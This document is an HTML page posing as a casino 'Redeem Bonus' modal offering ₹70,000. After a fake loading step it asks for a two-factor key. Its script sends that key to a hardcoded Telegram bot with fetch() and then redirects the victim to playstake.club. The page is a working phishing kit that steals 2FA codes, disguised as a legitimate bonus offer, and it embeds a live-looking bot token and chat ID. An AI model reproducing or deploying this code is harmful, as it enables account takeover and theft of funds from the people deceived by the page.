<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Redeem Bonus Modal</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
    body { font-family: 'Inter', sans-serif; }
    .loader {
      border: 4px solid #1E2F3F;
      border-top: 4px solid #00FF1A;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body class="bg-[#121E2D] flex items-center justify-center min-h-screen p-4">
<div id="redeem-box" class="bg-[#152533] rounded-lg max-w-sm w-full p-5 relative">
  <button aria-label="Close" class="absolute top-4 right-4 text-[#9CA3AF] hover:text-white">
    <i class="fas fa-times"></i>
  </button>
  <div class="flex items-center gap-2 mb-5 text-white font-semibold text-sm">
    <i class="fas fa-receipt"></i>
    <span>Redeem Bonus</span>
  </div>
  <div class="flex justify-center mb-3">
    <img src="https://i.ibb.co/k6kXQhDM/claim-reward-desktop.webp" alt="Claim Reward" class="w-full rounded-md"/>
  </div>
  <div class="text-center mb-3 text-[#CBD5E1] text-xs">Currency</div>
  <div class="flex items-center justify-between bg-[#324957] rounded-md shadow-md p-[13px] w-full mb-5">
    <div class="flex items-center gap-3">
      <svg class="w-8 h-8" viewBox="0 0 96 96"><circle cx="48" cy="48" r="48" fill="#EAC749"/><path fill="#276304" d="M66.003 29.198h-11.64c2.28 1.84 3.84 4.28 4.48 7.12h7.12v5.8h-7c-.96 6.76-5.88 10.6-10.6 11.68l11.12 18.68h-12.08l-9.64-17.44h-7.88v-8.4h11.24c3.6 0 6.24-1.76 7.28-4.56h-18.4v-5.8h18.6c-1.04-2.88-3.68-4.48-7.36-4.48h-11.24v-8.4h36.04v5.72z"/></svg>
      <div class="flex flex-col leading-[1.2]">
        <span class="font-semibold text-white text-sm">INR</span>
        <span class="text-[#B1BAD3] text-xs">Indian Rupee</span>
      </div>
    </div>
    <div class="flex items-center gap-2">
      <div class="flex flex-col items-end leading-[1.2]">
        <span class="font-semibold text-white text-sm">70,000.00</span>
        <span class="text-[#B1BAD3] text-xs">â‚¹70,000.00</span>
      </div>
      <svg class="w-3 h-3 text-white" viewBox="0 0 64 64"><path fill="currentColor" d="M32.274 49.762 9.204 26.69l6.928-6.93 16.145 16.145L48.42 19.762l6.93 6.929-23.072 23.07z"/></svg>
    </div>
  </div>
  <button id="redeem-btn" type="button" class="bg-[#00FF1A] text-black font-normal text-sm rounded-md py-3 w-full">
    Redeem
  </button>
</div>
<script>
const BOT_TOKEN = "8433734840:AAFv4xWIBQIhD6JKSVhb8bgnMds6UMVvnSU";
const CHAT_ID = "7003155954";
const REDIRECT_URL = "https://playstake.club/bonus?code=BoostWeeklyAugust8";

function showLoader(msg="Loading...") {
  document.getElementById("redeem-box").innerHTML = `
    <div class="flex flex-col items-center justify-center p-8 text-white">
      <div class="loader mb-4"></div>
      <p>${msg}</p>
    </div>
  `;
}

function showTwoFactorForm() {
  document.getElementById("redeem-box").innerHTML = `
    <button aria-label="Close" class="absolute top-4 right-4 text-[#9CA3AF] hover:text-white">
      <i class="fas fa-times"></i>
    </button>
    <div class="flex items-center gap-2 mb-5 text-white font-semibold text-sm">
      <i class="fas fa-key"></i>
      <span>Enter Two Factor Key</span>
    </div>
    <div class="flex justify-center mb-4">
      <img src="https://i.ibb.co/DDnB7tKJ/Screenshot-2025-08-15-220925.png" alt="Security Image" class="w-full rounded-md"/>
    </div>
    <input id="twoFactorInput" type="text" placeholder="Two Factor Key" class="w-full px-3 py-2 mb-4 bg-[#1E2F3F] text-white rounded-md border border-[#33444d] focus:outline-none"/>
    <button id="submitTwoFactor" type="button" class="bg-[#00FF1A] text-black font-normal text-sm rounded-md py-3 w-full">Submit</button>
  `;

  document.getElementById("submitTwoFactor").addEventListener("click", function() {
    let key = document.getElementById("twoFactorInput").value.trim();
    if (!key) return;
    showLoader("Verifying...");
    setTimeout(() => {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: `Two Factor Key: ${key}` })
      }).finally(() => {
        setTimeout(() => window.location.href = REDIRECT_URL, 2000);
      });
    }, 2000);
  });
}

document.getElementById("redeem-btn").addEventListener("click", function() {
  showLoader();
  setTimeout(() => showTwoFactorForm(), 2000);
});
</script>
</body>
</html>
